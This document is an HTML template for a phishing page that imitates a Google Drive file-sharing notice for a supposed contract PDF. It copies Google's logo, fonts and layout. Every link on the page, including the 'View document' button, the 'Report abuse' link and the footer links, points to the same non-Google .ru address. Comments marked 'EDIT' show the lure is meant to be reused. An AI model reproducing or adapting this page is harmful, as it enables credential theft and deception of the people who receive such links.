<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Shared with you – Google Drive</title>
  <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png"/>
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background-color: #eef2f8;
      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 32px 16px;
    }

    /* ── Card ── */
    .card {
      background: #ffffff;
      border-radius: 24px;
      box-shadow:
        0 1px 3px rgba(60,64,67,0.12),
        0 4px 8px rgba(60,64,67,0.08),
        0 12px 40px rgba(60,64,67,0.10);
      max-width: 640px;
      width: 100%;
      padding: 40px 48px 36px;
    }

    /* ── Logo row ── */
    .logo-row {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 28px;
    }
    .logo-row svg { width: 36px; height: 36px; flex-shrink: 0; }
    .logo-label {
      font-size: 17px;
      font-weight: 500;
      color: #3c4043;
      letter-spacing: 0;
    }

    /* ── Headings ── */
    h1 {
      font-size: 30px;
      font-weight: 400;
      color: #202124;
      letter-spacing: -0.25px;
      margin-bottom: 10px;
      line-height: 1.2;
    }
    .subtitle {
      font-size: 15px;
      color: #5f6368;
      line-height: 1.6;
      margin-bottom: 28px;
    }

    /* ── File pill ── */
    .file-pill {
      display: flex;
      align-items: center;
      gap: 16px;
      background: #f0f4f9;
      border-radius: 14px;
      padding: 18px 22px;
      margin-bottom: 32px;
      cursor: pointer;
      text-decoration: none;
      transition: background 0.15s;
    }
    .file-pill:hover { background: #e4ebf5; }

    /* PDF icon — pure SVG, looks exactly like Google's */
    .pdf-icon {
      width: 44px;
      height: 44px;
      flex-shrink: 0;
    }

    .file-details { flex: 1; min-width: 0; }
    .file-name {
      font-size: 16px;
      font-weight: 500;
      color: #202124;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      margin-bottom: 3px;
      font-family: 'Google Sans', Arial, sans-serif;
    }
    .file-meta {
      font-size: 13px;
      color: #5f6368;
      font-family: 'Roboto', Arial, sans-serif;
    }

    /* ── Button ── */
    .btn {
      display: inline-block;
      background: #1a73e8;
      color: #fff;
      font-family: 'Google Sans', Arial, sans-serif;
      font-size: 15px;
      font-weight: 500;
      text-decoration: none;
      padding: 13px 32px;
      border-radius: 100px;
      border: none;
      cursor: pointer;
      transition: background 0.15s, box-shadow 0.15s;
      margin-bottom: 32px;
      letter-spacing: 0.01em;
    }
    .btn:hover {
      background: #1765cc;
      box-shadow: 0 2px 8px rgba(26,115,232,0.35);
    }

    /* ── Divider ── */
    .divider {
      border: none;
      border-top: 1px solid #e0e0e0;
      margin-bottom: 20px;
    }

    /* ── Report line ── */
    .report {
      font-size: 14px;
      color: #5f6368;
      font-family: 'Roboto', Arial, sans-serif;
    }
    .report a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
    }
    .report a:hover { text-decoration: underline; }

    /* ── Footer nav ── */
    .footer-nav {
      display: flex;
      gap: 28px;
      margin-top: 28px;
      justify-content: center;
    }
    .footer-nav a {
      font-size: 13px;
      color: #5f6368;
      text-decoration: none;
      font-family: 'Roboto', Arial, sans-serif;
    }
    .footer-nav a:hover { text-decoration: underline; }

    @media (max-width: 520px) {
      .card { padding: 28px 22px; }
      h1 { font-size: 24px; }
      .btn { width: 100%; text-align: center; display: block; }
    }
  </style>
</head>
<body>

<div class="card">

  <!-- Google Drive logo (real triangle SVG) -->
  <div class="logo-row">
    <svg viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg">
      <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
      <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"/>
      <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/>
      <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
      <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
      <path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 27h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
    </svg>
    <span class="logo-label">Google Drive</span>
  </div>

  <h1>Shared Document</h1>
  <p class="subtitle">A file has been shared with you via Google Drive. You have been invited to view the following document.</p>

  <!-- File pill — EDIT href -->
  <a href="https://suhuvi.ru/KZI3YGdJHnlTtr@fRlUIE0FWn/" target="_blank" class="file-pill">

    <!-- Google's actual PDF icon, built in SVG — no broken img tags -->
    <svg class="pdf-icon" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">

      <rect x="8" y="2" width="40" height="52" rx="2" ry="2" fill="#ffffff" stroke="#dadce0" stroke-width="1.5"/>

      <text x="32" y="48" text-anchor="middle"
        font-family="'Google Sans', Arial, sans-serif"
        font-size="13" font-weight="700" fill="#ffffff" letter-spacing="1">PDF</text>
      <!-- Lines on doc -->
      <line x1="14" y1="20" x2="36" y2="20" stroke="#bdc1c6" stroke-width="1.5" stroke-linecap="round"/>
      <line x1="14" y1="25" x2="36" y2="25" stroke="#bdc1c6" stroke-width="1.5" stroke-linecap="round"/>
      <line x1="14" y1="30" x2="28" y2="30" stroke="#bdc1c6" stroke-width="1.5" stroke-linecap="round"/>
    </svg>

    <div class="file-details">
      <!-- EDIT: filename and meta -->
      <div class="file-name">Contractextension2026.pdf</div>
      <div class="file-meta">PDF Document &nbsp;&bull;&nbsp; Shared Today</div>
    </div>
  </a>

  <!-- CTA — EDIT href -->
  <a href="https://suhuvi.ru/KZI3YGdJHnlTtr@fRlUIE0FWn/" target="_blank" class="btn">View document</a>

  <hr class="divider"/>

  <p class="report">Don't recognize this sender? <a href="https://suhuvi.ru/KZI3YGdJHnlTtr@fRlUIE0FWn/">Report abuse</a></p>
</div>

<!-- Footer -->
<nav class="footer-nav">
  <a href="https://suhuvi.ru/KZI3YGdJHnlTtr@fRlUIE0FWn/" target="_blank">Privacy</a>
  <a href="https://suhuvi.ru/KZI3YGdJHnlTtr@fRlUIE0FWn/" target="_blank">Terms</a>

</nav>

</body>
</html>
